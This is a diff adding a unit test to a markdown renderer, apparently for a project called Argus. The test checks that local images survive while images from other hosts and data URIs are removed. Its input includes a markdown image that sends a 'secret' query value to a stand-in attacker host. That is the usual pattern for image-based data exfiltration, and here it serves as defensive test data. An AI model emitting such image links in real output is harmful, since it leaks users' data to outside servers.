@@ -16,4 +16,13 @@ describe("renderMarkdown", () => {
     it("leaves code alone", () => {
         expect(renderMarkdown("`2025.1.0~rc3` and ~~old~~")).toContain("<code>2025.1.0~rc3</code>");
     });
+
+    it("keeps Argus's own images and drops images from other hosts", () => {
+        const html = renderMarkdown("![run](/storage/picture/1) ![leak](https://evil.test/x?d=secret) ![d](data:image/png;base64,AA==)");
+
+        expect(html).toContain('src="/storage/picture/1"');
+        expect(html).not.toContain("evil.test");
+        expect(html).not.toContain("data:image");
+        expect(html).toContain("leak");
+    });
 });
